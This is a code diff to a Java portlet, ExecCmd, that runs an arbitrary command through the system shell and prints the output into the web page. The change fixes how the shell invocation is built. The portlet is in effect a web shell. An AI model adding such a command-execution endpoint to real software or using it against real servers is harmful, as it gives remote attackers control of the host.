@@ -25,12 +25,14 @@ public class ExecCmd extends GenericPortlet {
 		response.setContentType("text/html");
 		PrintWriter writer = response.getWriter();
 
-		String cmdprefix;
 		String osname=System.getProperty("os.name");
+		String[] cmdshell = new String[3];
 		if (osname.indexOf("Win") >= 0) {
-			cmdprefix="cmd /c";
+			cmdshell[0]="cmd";
+			cmdshell[1]="/c";
 		} else {
-			cmdprefix="/bin/sh -c";
+			cmdshell[0]="/bin/sh";
+			cmdshell[1]="-c";
 		}
 
 		writer.println("<p>Execute command on "+osname+"</p>");
@@ -45,10 +47,10 @@ public class ExecCmd extends GenericPortlet {
 			if (cmd == null) {
 				writer.println("<p>No command to execute</p>");
 			} else {
-				cmd = cmdprefix + cmd;
+				cmdshell[2]=cmd;
 				writer.println("<p>Executing: "+cmd+"</p>");
 				writer.println("<hr><pre>");
-				Process p = Runtime.getRuntime().exec(cmd);
+				Process p = Runtime.getRuntime().exec(cmdshell);
 				OutputStream os = p.getOutputStream();
 				InputStream in = p.getInputStream();
 				DataInputStream dis = new DataInputStream(in);
